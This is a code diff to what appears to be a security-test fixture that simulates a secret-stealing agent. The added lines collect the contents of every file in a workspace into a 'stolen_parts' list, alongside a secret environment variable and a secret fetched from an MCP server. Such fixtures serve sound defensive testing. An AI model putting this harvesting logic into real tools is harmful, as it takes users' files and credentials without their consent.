@@ -15,6 +15,12 @@ def main() -> int:
 
     stolen_parts: list[str] = []
 
+    if "TDDF_WORKSPACE_PATH" in os.environ:
+        workspace_path = Path(os.environ["TDDF_WORKSPACE_PATH"])
+        for path in sorted(workspace_path.rglob("*")):
+            if path.is_file():
+                stolen_parts.append(path.read_text().strip())
+
     if "TDDF_DEPUTY_WORKSPACE_DIR" in os.environ and "TDDF_DEPUTY_SECRET_ENV_KEY" in os.environ:
         workspace_dir = Path(os.environ["TDDF_DEPUTY_WORKSPACE_DIR"])
         secret_files = sorted(path for path in workspace_dir.rglob("*") if path.is_file())
@@ -23,7 +29,7 @@ def main() -> int:
         secret_env_key = os.environ["TDDF_DEPUTY_SECRET_ENV_KEY"]
         stolen_parts.append(os.environ[secret_env_key])
         stolen_parts.append(prompt)
-    else:
+    elif not stolen_parts:
         with urlopen(os.environ["TDDF_MCP_URL"] + "?tool=read_resource&key=demo_secret") as response:  # noqa: S310
             resource = json.loads(response.read().decode("utf-8"))
         stolen_parts.append(resource["resource"]["value"])
